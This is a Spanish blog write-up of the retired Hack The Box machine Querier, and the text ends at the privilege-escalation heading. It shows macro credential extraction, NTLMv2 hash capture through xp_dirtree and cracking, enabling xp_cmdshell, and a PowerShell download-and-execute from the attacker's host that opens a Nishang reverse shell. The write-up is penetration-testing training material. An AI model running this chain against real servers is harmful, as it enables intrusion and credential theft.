@@ -1,0 +1,782 @@
+<!DOCTYPE html>
+<html lang="es"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Maquina Retirada Querier de Hack The Box (Necesario VIP) | Pirrandi Blog</title>
+<meta name="generator" content="Jekyll v3.9.3" />
+<meta property="og:title" content="Maquina Retirada Querier de Hack The Box (Necesario VIP)" />
+<meta name="author" content="Pirrandi" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada Querier" />
+<meta property="og:description" content="En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada Querier" />
+<link rel="canonical" href="http://localhost:4000/2022/01/04/Querier.html" />
+<meta property="og:url" content="http://localhost:4000/2022/01/04/Querier.html" />
+<meta property="og:site_name" content="Pirrandi Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-01-04T00:00:00-03:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Maquina Retirada Querier de Hack The Box (Necesario VIP)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Pirrandi"},"dateModified":"2022-01-04T00:00:00-03:00","datePublished":"2022-01-04T00:00:00-03:00","description":"En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada Querier","headline":"Maquina Retirada Querier de Hack The Box (Necesario VIP)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2022/01/04/Querier.html"},"url":"http://localhost:4000/2022/01/04/Querier.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Pirrandi Blog" /></head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">Pirrandi Blog<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color--hover" href=""><i class="fab fa-"></i></a><a class="color--hover" href=""><i class="fab fa-"></i></a><a class="color--hover" href=""><i class="fab fa-"></i></a>
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+    
+    
+        <img src="" class="author-avatar" alt="Avatar" />
+    
+Este es mi blog personal sobre Conceptos Hacking Etico // HTB // TryHackMe // Resumenes de Hacking // Herramientas para distintas tareas.
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">Maquina Retirada Querier de Hack The Box (Necesario VIP)</h1>
+  
+  <div class="post-tags">
+     
+      <a class="tag" href="/tag/HTB,/">HTB,</a>
+      
+      <a class="tag" href="/tag/SmbClient,/">SmbClient,</a>
+      
+      <a class="tag" href="/tag/SmbMap,/">SmbMap,</a>
+      
+      <a class="tag" href="/tag/Enumeracion,/">Enumeracion,</a>
+      
+      <a class="tag" href="/tag/Olevba/">Olevba</a>
+      
+      <a class="tag" href="/tag/Archivos/">Archivos</a>
+      
+      <a class="tag" href="/tag/Excel,/">Excel,</a>
+      
+      <a class="tag" href="/tag/Myssql-Server,/">Myssql-Server,</a>
+      
+      <a class="tag" href="/tag/Mssqlclient,/">Mssqlclient,</a>
+      
+      <a class="tag" href="/tag/Sqsh,/">Sqsh,</a>
+      
+      <a class="tag" href="/tag/Xp_dirtree,/">Xp_dirtree,</a>
+      
+      <a class="tag" href="/tag/Xp_CmdShell,/">Xp_CmdShell,</a>
+      
+      <a class="tag" href="/tag/RCE,/">RCE,</a>
+      
+      <a class="tag" href="/tag/Nishang,/">Nishang,</a>
+      
+      <a class="tag" href="/tag/PowerUp,/">PowerUp,</a>
+      
+      <a class="tag" href="/tag/Maquinas/">Maquinas</a>
+      
+      <a class="tag" href="/tag/Retiradas,/">Retiradas,</a>
+      
+      <a class="tag" href="/tag/Post-Explotacion./">Post-Explotacion.</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 04 Jan 2022</div>
+  
+  <noscript>
+    <div class="post-description">En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada Querier</div>
+  </noscript>
+  <div id="animated-post-description" class="post-description" style="display: none;"></div>
+  
+  <h1 id="querier--hack-the-box">Querier ~ Hack The Box</h1>
+
+<p>Realizamos el Primer escaneo con Nmap</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">$" nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allports 10.10.10.125       "</span>
+</code></pre></div></div>
+<p>Procedemos con el siguiente escaneo de Nmap</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#PORT      STATE SERVICE       VERSION</span>
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00<span class="p">;</span> RTM
+| ms-sql-ntlm-info: 
+|   Target_Name: HTB
+|   NetBIOS_Domain_Name: HTB
+|   NetBIOS_Computer_Name: QUERIER
+|   DNS_Domain_Name: HTB.LOCAL
+|   DNS_Computer_Name: QUERIER.HTB.LOCAL
+|   DNS_Tree_Name: HTB.LOCAL
+|_  Product_Version: 10.0.17763
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
+| Not valid before: 2022-01-26T17:55:09
+|_Not valid after:  2052-01-26T17:55:09
+|_ssl-date: 2022-01-26T18:23:29+00:00<span class="p">;</span> +17m07s from scanner time.
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  msrpc         Microsoft Windows RPC
+49671/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 17m06s, deviation: 0s, median: 17m06s
+| ms-sql-info: 
+|   10.10.10.125:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2017 RTM
+|       number: 14.00.1000.00
+|       Product: Microsoft SQL Server 2017
+|       Service pack level: RTM
+|       Post-SP patches applied: <span class="nb">false</span>
+|_    TCP port: 1433
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   <span class="nb">date</span>: 2022-01-26T18:23:25
+|_  start_date: N/A
+</code></pre></div></div>
+
+<p>Procedemos a enumera el servicio por SMB</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># smbmap -H 10.10.10.125 -u null </span>
+<span class="o">[</span>+] Guest session       IP: 10.10.10.125:445    Name: 10.10.10.125                                      
+        Disk                                                    Permissions     Comment
+        <span class="nt">----</span>                                                    <span class="nt">-----------</span>     <span class="nt">-------</span>
+        ADMIN<span class="nv">$ </span>                                                 NO ACCESS       Remote Admin
+        C<span class="nv">$ </span>                                                     NO ACCESS       Default share
+        IPC<span class="nv">$ </span>                                                   READ ONLY       Remote IPC
+        Reports                                                 READ ONLY
+</code></pre></div></div>
+
+<p>Procedemos a Conectarnos al Recurso llamado <code class="language-plaintext highlighter-rouge">Reports</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># smbclient //10.10.10.125/Reports -u null                                                                          1 ⚙</span>
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
+  <span class="nb">.</span>                                   D        0  Tue Jan 29 00:23:48 2019
+  ..                                  D        0  Tue Jan 29 00:23:48 2019
+  Currency Volume Report.xlsm         A    12229  Sun Jan 27 23:21:34 2019
+
+                6469119 blocks of size 4096. 1589814 blocks available
+smb: <span class="se">\&gt;</span> get <span class="s2">"Currency Volume Report.xlsm"</span>
+getting file <span class="se">\C</span>urrency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm <span class="o">(</span>22,9 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 22,9 KiloBytes/sec<span class="o">)</span>
+smb: <span class="se">\&gt;</span> <span class="nb">exit</span> 
+</code></pre></div></div>
+
+<p>El archivo tiene formato <code class="language-plaintext highlighter-rouge">.xlsm</code> podria ser una archi excell ?? 
+Probamos a sacar informacion del archivo</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># ls                                                                                                     </span>
+Currency_Volume_Report.xlsm
+
+<span class="c"># file Currency_Volume_Report.xlsm             </span>
+Currency_Volume_Report.xlsm: Microsoft Excel 2007+
+</code></pre></div></div>
+<h1 id="olevba---excell-files">Olevba - Excell Files</h1>
+<p>Para analizar archivos <code class="language-plaintext highlighter-rouge">Excell</code> tenemos una herramienta llamada <code class="language-plaintext highlighter-rouge">olevba</code> con la que podemos listar informacion</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># olevba Currency_Volume_Report.xlsm                            1 ⚙</span>
+olevba 0.56.1 on Python 3.9.8 - http://decalage.info/python/oletools
+<span class="o">===============================================================================</span>
+FILE: Currency_Volume_Report.xlsm
+Type: OpenXML
+WARNING  For now, VBA stomping cannot be detected <span class="k">for </span>files <span class="k">in </span>memory
+<span class="nt">-------------------------------------------------------------------------------</span>
+VBA MACRO ThisWorkbook.cls 
+<span class="k">in </span>file: xl/vbaProject.bin - OLE stream: <span class="s1">'VBA/ThisWorkbook'</span>
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+ macro to pull data <span class="k">for </span>client volume reports
+
+ further testing required
+
+Private Sub Connect<span class="o">()</span>
+
+Dim conn As ADODB.Connection
+Dim rs As ADODB.Recordset
+
+Set conn <span class="o">=</span> New ADODB.Connection
+conn.ConnectionString <span class="o">=</span> <span class="s2">"Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume; || Uid=reporting;Pwd=PcwTWTHRwryjc</span><span class="nv">$c6</span><span class="s2"> || "</span>
+conn.ConnectionTimeout <span class="o">=</span> 10
+conn.Open
+
+If conn.State <span class="o">=</span> adStateOpen Then
+
+  <span class="s1">' MsgBox "connection successful"
+ 
+  '</span>Set rs <span class="o">=</span> conn.Execute<span class="o">(</span><span class="s2">"SELECT * @@version;"</span><span class="o">)</span>
+  Set rs <span class="o">=</span> conn.Execute<span class="o">(</span><span class="s2">"SELECT * FROM volume;"</span><span class="o">)</span>
+  Sheets<span class="o">(</span>1<span class="o">)</span>.Range<span class="o">(</span><span class="s2">"A1"</span><span class="o">)</span>.CopyFromRecordset rs
+  rs.Close
+
+End If
+
+End Sub
+<span class="nt">-------------------------------------------------------------------------------</span>
+VBA MACRO Sheet1.cls 
+<span class="k">in </span>file: xl/vbaProject.bin - OLE stream: <span class="s1">'VBA/Sheet1'</span>
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+<span class="o">(</span>empty macro<span class="o">)</span>
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|Suspicious|Open                |May open a file                              |
+|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
+|          |                    |used to obfuscate strings <span class="o">(</span>option <span class="nt">--decode</span> to|
+|          |                    |see all<span class="o">)</span>                                     |
++----------+--------------------+---------------------------------------------+
+</code></pre></div></div>
+
+<p>Encontramos un usario y su Contraseña</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reporting:PcwTWTHRwryjc<span class="nv">$c6</span>
+</code></pre></div></div>
+<h1 id="crackmapexec">Crackmapexec</h1>
+
+<p>Procedemos a validarla con <code class="language-plaintext highlighter-rouge">Cracmapexec</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># crackmapexec smb 10.10.10.125 -u reporting -p 'PcwTWTHRwryjc$c6'   </span>
+SMB         10.10.10.125    445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="s2">"(domain:HTB.LOCAL)"</span><span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.125    445    QUERIER          <span class="o">[</span>-] HTB.LOCAL<span class="se">\r</span>eporting:PcwTWTHRwryjc<span class="nv">$c6</span> STATUS_NO_LOGON_SERVERS 
+</code></pre></div></div>
+
+<p>Vemos que esta probando la contraseña a nivel de dominio Activo, pero nos interesa hacerlo para el dominio <code class="language-plaintext highlighter-rouge">WORKGROUP</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># crackmapexec smb 10.10.10.125 -u reporting -p 'PcwTWTHRwryjc$c6' -d WORKGROUP  </span>
+SMB         10.10.10.125    445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:WORKGROUP<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.125    445    QUERIER          <span class="o">[</span>+] WORKGROUP<span class="se">\r</span>eporting:PcwTWTHRwryjc<span class="nv">$c6</span>
+</code></pre></div></div>
+
+<p>Vemos como para el dominio local si que tenemos una contraseña valida. 
+Antes que nada vamos a seguir mirando puertos abiertos interesantes para enumerar un poco por encima.</p>
+
+<h1 id="mssqlclientpy">Mssqlclient.py</h1>
+
+<p>Aqui hay que tener cuidado ya que como habiamos visto con <code class="language-plaintext highlighter-rouge">Crackmapexec</code> las <code class="language-plaintext highlighter-rouge">crendeciales</code> eran para el <code class="language-plaintext highlighter-rouge">GRUPO de TRABAJO/WORKGROUP</code> aqui en la conexion de autenticacion tendriamos que indicarlo con el parametro <code class="language-plaintext highlighter-rouge">-windows-auth</code> sino no nos funcionara.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># mssqlclient.py 'WORKGROUP/reporting:PcwTWTHRwryjc$c6'@10.10.10.125 -windows-auth                                           1 ⚙</span>
+Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: volume
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: 16192
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: Changed database context to <span class="s1">'volume'</span><span class="nb">.</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: Changed language setting to us_english.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ACK: Result: 1 - Microsoft SQL Server <span class="o">(</span>140 3232<span class="o">)</span> 
+<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+SQL&gt; 
+</code></pre></div></div>
+
+<h1 id="xp_dirtree">Xp_dirtree</h1>
+<p>Usamos la funcion de mysql-server por la cual hacemos una peticion a un recurso local o externo. Permitiendonos asi postear un
+recurso compartido a nivel de red para interceptar el Hash Net NTLMV2 que sirva para crackearlo, y si la contraseña es debil, se tenso.</p>
+
+<p>Hacemos la peticion a nivel de Red para inteceptar el Hash</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL&gt; xp_dirtree <span class="s2">"//10.10.16.3/caca"</span>
+subdirectory                                                                                                                                                                                                                                                            depth   
+
+<span class="nt">---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span>   <span class="nt">-----------</span>   
+
+SQL&gt; 
+
+</code></pre></div></div>
+
+<p>Recurso Compartido de Nuestro Lado Attacante</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># impacket-smbserver smbFolder $(pwd) -smb2support</span>
+Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.10.10.125,49675<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>QUERIER<span class="se">\m</span>ssql-svc,QUERIER<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> User QUERIER<span class="se">\m</span>ssql-svc authenticated successfully
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s2">"mssql-svc::QUERIER:aaaaaaaaaaaaaaaa:0642e72a441030d47a763c00c904aaeb:010100000000000080538e39e112d8019cd5667bcfcfd83e0000000001001000530068004a004e00760064006b00670003001000530068004a004e00760064006b00670002001000530056004f00740055004a0070007a0004001000530056004f00740055004a0070007a000700080080538e39e112d801060004000200000008003000300000000000000000000000003000003a2a8b8bb974a03e4d78308603f3c73b02c7f94cb7f3041d9dc5376f9f96f69d0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003300000000000000000000000000      "</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
+<span class="o">[</span>-] SMB2_TREE_CONNECT not found caca
+<span class="o">[</span>-] SMB2_TREE_CONNECT not found caca
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>QUERIER<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> User QUERIER<span class="se">\ </span>authenticated successfully
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> :::00::aaaaaaaaaaaaaaaa
+</code></pre></div></div>
+
+<p>Procedemos a copiarnos el Hash a un archivito
+Procedemos a usar la herramienta <code class="language-plaintext highlighter-rouge">John</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># john --wordlist=/usr/share/wordlists/rockyou.txt Hash_NetNtlmV2                            1 ⚙</span>
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64]<span class="o">)</span>
+Will run 8 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+<span class="s2">"corporate568     (mssql-svc)"</span>
+1g 0:00:00:01 DONE <span class="o">(</span>2022-01-26 19:22<span class="o">)</span> 0.5780g/s 5180Kp/s 5180Kc/s 5180KC/s correemilio..coreyny
+Use the <span class="s2">"--show --format=netntlmv2"</span> options to display all of the cracked passwords reliably
+Session completed
+</code></pre></div></div>
+
+<p>Nuevas credenciales</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mssql-svc:corporate568
+</code></pre></div></div>
+
+<p>Procedemos a Validar las Credenciales obtenidas con Crackmapexec</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># crackmapexec smb 10.10.10.125 -u mssql-svc -p 'corporate568' -d WORKGROUP   </span>
+SMB         10.10.10.125    445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:WORKGROUP<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.125    445    QUERIER          <span class="o">[</span>+] WORKGROUP<span class="se">\m</span>ssql-svc:corporate568
+
+<span class="c"># crackmapexec smb 10.10.10.125 -u mssql-svc -p 'corporate568' -d WORKGROUP                                                                                                                                  1 ⚙</span>
+SMB         10.10.10.125    445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:WORKGROUP<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.125    445    QUERIER          <span class="o">[</span>+] WORKGROUP<span class="se">\m</span>ssql-svc:corporate568 
+                                                                                                                                
+└─# crackmapexec winrm 10.10.10.125 <span class="nt">-u</span> mssql-svc <span class="nt">-p</span> <span class="s1">'corporate568'</span> <span class="nt">-d</span> WORKGROUP           1 ⚙
+WINRM       10.10.10.125    5985   10.10.10.125     <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.10.125:5985/wsman
+WINRM       10.10.10.125    5985   10.10.10.125     <span class="o">[</span>-] WORKGROUP<span class="se">\m</span>ssql-svc:corporate568
+</code></pre></div></div>
+
+<p>Vemos que aun con las dos credenciales no tenemos acceso por winrm
+Volvemos a Autenticarnos por mysql-service</p>
+
+<h1 id="mssclientpy---xp_cmdshell">Mssclient.py - Xp_CmdShell</h1>
+
+<p>Ejecucion de comandos atraves de la opcion <code class="language-plaintext highlighter-rouge">XP_CMDSHELL</code> en mysql-service</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># mssqlclient.py 'WORKGROUP/mssql-svc:corporate568'@10.10.10.125 -windows-auth                      130 ⨯</span>
+Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: master
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: 16192
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: Changed database context to <span class="s1">'master'</span><span class="nb">.</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: Changed language setting to us_english.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ACK: Result: 1 - Microsoft SQL Server <span class="o">(</span>140 3232<span class="o">)</span> 
+<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+
+<span class="c">### Paso 1 - Ver el error</span>
+SQL&gt; xp_cmdshell <span class="s2">"whoami"</span>
+<span class="o">[</span>-] ERROR<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: SQL Server blocked access to procedure <span class="s1">'sys.xp_cmdshell'</span> of component <span class="s1">'xp_cmdshell'</span> because this component is turned off as part of the security configuration <span class="k">for </span>this server. A system administrator can <span class="nb">enable </span>the use of <span class="s1">'xp_cmdshell'</span> by using sp_configure. For more information about enabling <span class="s1">'xp_cmdshell'</span>, search <span class="k">for</span> <span class="s1">'xp_cmdshell'</span> <span class="k">in </span>SQL Server Books Online.
+<span class="c">### Paso 2 - Reconfigurar las opciones avanzadas</span>
+SQL&gt; sp_configure <span class="s2">"show advanced options"</span>, 1
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 185: Configuration option <span class="s1">'show advanced options'</span> changed from 0 to 1. Run the RECONFIGURE statement to install.
+<span class="c">### Paso 3 - Intento Erroneo de Reconfigurar la opcion XP_CMDSHELL</span>
+SQL&gt; sp_configure <span class="s2">"xp_cmdshell"</span>, 1
+<span class="o">[</span>-] ERROR<span class="o">(</span>QUERIER<span class="o">)</span>: Line 62: The configuration option <span class="s1">'xp_cmdshell'</span> does not exist, or it may be an advanced option.
+<span class="c">### Paso 4 - Re Seteamos el habilitar que se muestren las opciones avanzadas</span>
+SQL&gt; sp_configure <span class="s2">"show advanced"</span>, 1
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 185: Configuration option <span class="s1">'show advanced options'</span> changed from 1 to 1. Run the RECONFIGURE statement to install.
+SQL&gt; reconfigure
+<span class="c">### Paso 5 - Configuramos la opcion xp_cmdShell para que este habilitada</span>
+SQL&gt; sp_configure <span class="s2">"xp_cmdshell"</span>, 1
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 185: Configuration option <span class="s1">'xp_cmdshell'</span> changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL&gt; reconfigure
+<span class="c">###Paso 6 - R C E - Ejecucion de Comandos</span>
+SQL&gt; xp_cmdshell <span class="s2">"whoami"</span>
+output                                                                             
+
+<span class="nt">--------------------------------------------------------------------------------</span>   
+
+querier<span class="se">\m</span>ssql-svc                                                                  
+
+NULL                                                                               
+
+aSQL&gt; 
+</code></pre></div></div>
+
+<p>Procedemos a Ganar acceso a la maquina Victima con el uso de <code class="language-plaintext highlighter-rouge">Nishang</code> para ello vamos a postear un archivo del
+repositorio de nishan que se va a ejecutar en la maquina victima atraves de una peticion via web a un servidor que nos vamos a estar
+compartiendo con python3 desde nuestra maquina atacante con nuestro archivo malicioso Invoke-TCP-Powershell.ps1</p>
+
+<h1 id="intrusion-con-powershell---user-mssql-svc">Intrusion con PowerShell - User mssql-svc</h1>
+
+<p>Preparamos el comando listo para ejecutarlo con la utilidad <code class="language-plaintext highlighter-rouge">XP_CMDSHELL</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL&gt; xp_cmdshell <span class="s2">"powershell IEX(New-Object Net.WebClient).downloadString(</span><span class="se">\"</span><span class="s2">http://10.10.16.3/PST.ps1</span><span class="se">\"</span><span class="s2">)"</span>
+</code></pre></div></div>
+
+<p>Ponemos nuestro servidor con <code class="language-plaintext highlighter-rouge">Python3</code> y nuestro archivo malicioso renombrado <code class="language-plaintext highlighter-rouge">PST.ps1</code> y habiendole indicado al final del mismo la intruccion que quemos que nos cargue para que conforme se interprete llame a la funcion que le indicamos al final</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">" Invoke-PowerShellTcp -Reverse -IPAddress &lt;IP&gt; -Port 443        "</span>
+</code></pre></div></div>
+
+<p>Recibimos correctamente la peticion al recurso en nuestro servidor</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># python3 -m http.server 80                           1 ⚙</span>
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+10.10.10.125 - - <span class="o">[</span>26/Jan/2022 19:49:10] <span class="s2">"GET /PST.ps1 HTTP/1.1"</span> 200 -
+</code></pre></div></div>
+<p>Y habiendo preparado una session a la escucha con <code class="language-plaintext highlighter-rouge">nc</code> por el puerto indicado</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># rlwrap nc -vlnp 443 </span>
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.16.3] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.125] 49677
+Windows PowerShell running as user mssql-svc on QUERIER
+Copyright <span class="o">(</span>C<span class="o">)</span> 2015 Microsoft Corporation. All rights reserved.
+
+PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
+<span class="nb">whoami
+</span>querier<span class="se">\m</span>ssql-svc
+</code></pre></div></div>
+
+<h1 id="privesc---powerupps1---enumeracion-windows">Privesc - PowerUp.ps1 - Enumeracion Windows</h1>
